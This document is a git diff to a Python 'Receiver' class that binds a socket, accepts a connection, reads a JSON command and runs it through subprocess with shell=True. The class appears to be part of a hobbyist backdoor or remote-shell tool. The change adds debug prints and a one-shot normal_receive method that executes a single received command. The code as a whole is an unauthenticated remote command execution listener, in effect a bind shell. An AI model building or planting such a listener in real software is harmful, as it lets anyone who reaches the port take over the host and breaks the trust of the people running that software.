@@ -54,6 +54,7 @@ class Receiver:
 	def execute_command(self,command):
 	
 		try:
+			print("command to be fired >>>",command)
 			return subprocess.check_output(command,shell=True)
 		except:
 			command_result = "Invalid Command"
@@ -69,11 +70,24 @@ class Receiver:
 				result = result + self.conn.recv(1024)
 				#command=json.loads(command)
 				#result = result.decode()
-				#print("incoming data>>",result)
+				print("incoming data>>",result)
+				#print("incoming data>>",type(result))
 				return json.loads(result)
 			except ValueError:
-				#print("More data is pending")
+				print("More data is pending")
 				continue
+				
+	def normal_receive(self):
+			self.accept_connection()
+			command =  self.conn.recv(1024)
+			print("[+]command received >>",command)
+			command = json.loads(command)
+			command_result = self.execute_command(command).decode()
+			
+			self.conn.close()
+			return command_result
+			
+		
 		
 	def json_send(self,command):
 		json_command = json.dumps(command)
@@ -90,15 +104,18 @@ class Receiver:
 
 			
 			command = self.receive()
+			print("[+]command received >>",command)
 			command_result = self.execute_command(command).decode()
-			
+			print("[+] command>>>>>>>",command)
 
-			self.json_send(command_result)
+			#self.json_send(command_result)
 			
 		self.conn.close()
 		
 receiver=Receiver()
 receiver.create_socket()
 receiver.bind_socket()
-
-receiver.run()
+#receiver.run()
+result = receiver.normal_receive()
+print("[+] Command Result >>>> ",result)
+print(type(result))
